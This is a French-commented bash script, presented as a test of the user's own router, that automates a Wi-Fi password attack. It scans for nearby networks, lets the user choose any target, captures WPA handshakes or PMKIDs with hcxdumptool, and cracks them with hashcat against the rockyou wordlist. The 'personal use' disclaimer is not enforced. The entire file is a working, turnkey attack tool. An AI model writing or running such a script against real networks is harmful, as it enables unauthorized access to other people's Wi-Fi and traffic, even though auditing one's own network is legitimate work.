#!/bin/bash
# test-wifi.sh — Teste la securite WPA3 de TON routeur (usage perso uniquement)
# Usage (Kali, en root) : bash test-wifi.sh
# Il te demande juste le nom de ton WiFi, le reste est automatique.
set -u
WORK=/tmp/wifi-test
mkdir -p "$WORK"
cd "$WORK" || exit 1

echo "=== 1. Checks ==="
if [ "$(id -u)" != "0" ]; then echo "ERROR: run this script as root (on Kali you are already root)."; exit 1; fi
for t in iw airmon-ng airodump-ng hcxdumptool hcxpcapngtool hashcat python3; do
  if ! command -v "$t" >/dev/null 2>&1; then
    echo "Missing tool: $t — installing..."
    apt update && apt install -y hcxtools hashcat aircrack-ng || { echo "Install failed. Check internet."; exit 1; }
    break
  fi
done
echo "Tools OK."

echo ""
echo "=== 2. WiFi adapter ==="
lsusb | grep -i atheros && echo "(TL-WN722N V1 detected)" || echo "(no Atheros USB found — using the card below)"
IFACE=""
for i in $(iw dev | awk '/Interface/{print $2}'); do
  drv=$(basename "$(readlink "/sys/class/net/$i/device/driver" 2>/dev/null)" 2>/dev/null || echo "?")
  echo " - $i (driver: $drv)"
  if [ "$drv" = "ath9k_htc" ]; then IFACE="$i"; fi
done
if [ -z "$IFACE" ]; then
  IFACE=$(iw dev | awk '/Interface/{print $2; exit}')
fi
if [ -z "$IFACE" ]; then echo "ERROR: no WiFi card found. Plug in the TL-WN722N V1 and re-run."; exit 1; fi
echo "Using interface: $IFACE"

echo ""
echo "=== 3. Monitor mode ==="
airmon-ng check kill >/dev/null 2>&1
MON=""
airmon-ng start "$IFACE" >/dev/null 2>&1
if iw dev 2>/dev/null | grep -q "${IFACE}mon"; then
  MON="${IFACE}mon"
else
  ip link set "$IFACE" down 2>/dev/null
  iw "$IFACE" set monitor control 2>/dev/null
  ip link set "$IFACE" up 2>/dev/null
  MON="$IFACE"
fi
if [ -z "$MON" ] || ! iw dev 2>/dev/null | grep -q "$MON"; then
  echo "ERROR: could not start monitor mode."
  exit 1
fi
echo "Monitor mode OK on: $MON"

echo ""
echo "=== 4. Scan (15 seconds) ==="
rm -f "$WORK/scan-01.csv" "$WORK/nets.txt"
timeout 15 airodump-ng --output-format csv -w "$WORK/scan" "$MON" >/dev/null 2>&1
python3 - "$WORK/scan-01.csv" <<'PYEOF'
import csv, sys
path = sys.argv[1]
nets = []
try:
    with open(path, newline='', encoding='utf-8', errors='ignore') as f:
        r = csv.reader(f)
        for row in r:
            if not row or row[0].strip() == 'BSSID':
                continue
            if row[0].strip() == 'Station MAC':
                break
            if len(row) < 14:
                continue
            bssid = row[0].strip()
            ch = row[3].strip()
            enc = row[5].strip()
            ssid = row[13].strip()
            if bssid and ssid:
                nets.append((ssid, bssid, ch, enc))
except FileNotFoundError:
    pass
seen = set()
uniq = []
for ssid, bssid, ch, enc in nets:
    if (ssid, bssid) in seen:
        continue
    seen.add((ssid, bssid))
    uniq.append((ssid, bssid, ch, enc))
for n, (ssid, bssid, ch, enc) in enumerate(uniq, 1):
    print(f"{n}. {ssid} | {bssid} | channel {ch} | {enc}")
with open('/tmp/wifi-test/nets.txt', 'w') as f:
    for ssid, bssid, ch, enc in uniq:
        f.write(f"{ssid}\t{bssid}\t{ch}\t{enc}\n")
if not uniq:
    print("(no network found — is the adapter working?)")
PYEOF

echo ""
read -p "Choose your WiFi (number): " CHOICE
TARGET=$(python3 - "$CHOICE" <<'PYEOF'
import sys
try:
    n = int(sys.argv[1])
except ValueError:
    print("NOTFOUND"); sys.exit()
lines = []
try:
    with open('/tmp/wifi-test/nets.txt') as f:
        for line in f:
            parts = line.rstrip('\n').split('\t')
            if len(parts) >= 4:
                lines.append(parts)
except FileNotFoundError:
    pass
if 1 <= n <= len(lines):
    ssid, bssid, ch, enc = lines[n-1]
    print(f"{bssid}\t{ch}\t{ssid}")
else:
    print("NOTFOUND")
PYEOF
)
if [ "$TARGET" = "NOTFOUND" ] || [ -z "$TARGET" ]; then
  echo "ERROR: bad choice. Re-run and pick a number from the list."
  airmon-ng stop "$MON" >/dev/null 2>&1
  exit 1
fi
BSSID=$(echo "$TARGET" | cut -f1)
CHAN=$(echo "$TARGET" | cut -f2)
SSID=$(echo "$TARGET" | cut -f3-)
echo "Target: $SSID | BSSID $BSSID | channel $CHAN"

echo ""
echo "=== 5. Capture (2 minutes) ==="
echo "While it runs, reconnect a device to the WiFi (e.g. turn your phone WiFi off/on)."
rm -f "$WORK/cap.pcapng"
timeout 120 hcxdumptool -i "$MON" -o "$WORK/cap.pcapng" --enable_status=1
echo ""
echo "=== 6. Convert ==="
rm -f "$WORK/hash.hc22000"
hcxpcapngtool -o "$WORK/hash.hc22000" "$WORK/cap.pcapng" 2>/dev/null
if [ ! -s "$WORK/hash.hc22000" ]; then
  echo "No handshake/PMKID captured."
  echo "Reconnect a device to the WiFi and re-run the script (bash test-wifi.sh)."
  airmon-ng stop "$MON" >/dev/null 2>&1
  exit 0
fi
echo "Handshake captured!"

echo ""
echo "=== 7. Password test (hashcat — slow on CPU, let it run) ==="
WL=/usr/share/wordlists/rockyou.txt
if [ ! -f "$WL" ]; then
  if [ -f /usr/share/wordlists/rockyou.txt.gz ]; then
    echo "Extracting rockyou..."
    gzip -dc /usr/share/wordlists/rockyou.txt.gz > "$WORK/rockyou.txt"
    WL="$WORK/rockyou.txt"
  else
    echo "rockyou wordlist not found. Try: apt install -y wordlists"
    airmon-ng stop "$MON" >/dev/null 2>&1
    exit 1
  fi
fi
hashcat -m 22000 "$WORK/hash.hc22000" "$WL" --potfile-path "$WORK/test-wifi.pot" --status --status-timer=60 || echo "TIP: if hashcat says 'No devices found', run: apt install -y pocl"
echo ""
echo "=== Result ==="
hashcat -m 22000 "$WORK/hash.hc22000" "$WL" --show --potfile-path "$WORK/test-wifi.pot" 2>/dev/null
echo ""
echo "(If nothing is shown above: password NOT found in rockyou = good sign.)"
airmon-ng stop "$MON" >/dev/null 2>&1
echo "Monitor mode stopped. Files in $WORK"
